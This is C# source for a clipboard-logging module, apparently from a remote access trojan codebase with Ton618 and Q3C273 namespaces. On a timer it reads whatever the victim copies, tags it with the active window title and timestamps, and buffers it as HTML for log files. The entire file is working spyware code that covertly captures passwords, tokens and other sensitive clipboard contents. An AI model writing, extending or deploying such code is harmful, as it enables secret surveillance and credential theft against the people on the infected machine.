using Q3C273.Shared.Cryptography;
using Q3C273.Shared.Helpers;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Text;
using System.Timers;
using System.Web;
using System.Windows.Forms;
using Ton618.Config;
using Ton618.Extensions;
using Ton618.Helper;
using Ton618.Utilities;
using Timer = System.Timers.Timer;

namespace Ton618.Logging
{
    /// <summary>
    /// This class provides keylogging functionality and modifies/highlights the output for
    /// better user experience.
    /// </summary>
    public class Cliplogger : LoggerBase
    {
        private readonly Timer captureTimer;

        /// <summary>
        /// Saves the last window title of an application.
        /// </summary>
        private string lastWindowTitle = string.Empty;

        private uint lastSequenceNumber = 0;

        /// <summary>
        /// Initializes a new instance of <see cref="Keylogger"/> that provides keylogging functionality.
        /// </summary>
        /// <param name="flushInterval">The interval to flush the buffer from memory to disk.</param>
        /// <param name="maxLogFileSize">The maximum size of a single log file.</param>
        public Cliplogger(double captureInterval, double flushInterval, long maxLogFileSize) : base("Clipboard", flushInterval, maxLogFileSize)
        {
            captureTimer = new Timer
            {
                Interval = captureInterval
            };
            captureTimer.Elapsed += Capture;
        }

        protected override void OnStart() => captureTimer.Start();

        protected override void OnDispose()
        {
            captureTimer.Stop();
            captureTimer.Dispose();
        }

        private void Capture(object sender, ElapsedEventArgs e)
        {
            var seqNum = ClientNatives.GetClipboardSequenceNumber();
            if (lastSequenceNumber == seqNum)
                return;

            var activeWindowTitle = NativeMethodsHelper.GetForegroundWindowTitle();
            if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != lastWindowTitle)
            {
                lastWindowTitle = activeWindowTitle;
                LogBuffer
                    .Append(@"<p class=""h""><br><br>[<b>")
                    .Append(HttpUtility.HtmlEncode(activeWindowTitle))
                    .Append(" - Local=")
                    .Append(DateTime.Now.ToString("t", DateTimeFormatInfo.InvariantInfo))
                    .Append(" UTC=")
                    .Append(DateTime.UtcNow.ToString("t", DateTimeFormatInfo.InvariantInfo))
                    .Append("</b>]</p><br>");
            }

            var data = NativeClipboard.GetClipboardContent();
            if (data.Length > 1024)
                data = data.Substring(0, 1024) + " (truncated)"; // truncate

            LogBuffer
                .Append(@"<p class=""h""><br>")
                .Append("Local=")
                .Append(DateTime.Now.ToString("t", DateTimeFormatInfo.InvariantInfo))
                .Append(" UTC=")
                .Append(DateTime.UtcNow.ToString("t", DateTimeFormatInfo.InvariantInfo))
                .Append(" Data=")
                .Append(HttpUtility.HtmlEncode(data))
                .Append("</p>");

            lastSequenceNumber = seqNum;
        }
        protected override string LogFileNameSupplier(int fileIndex) => Settings.GetClipLogFileNameFormat(fileIndex);
    }
}
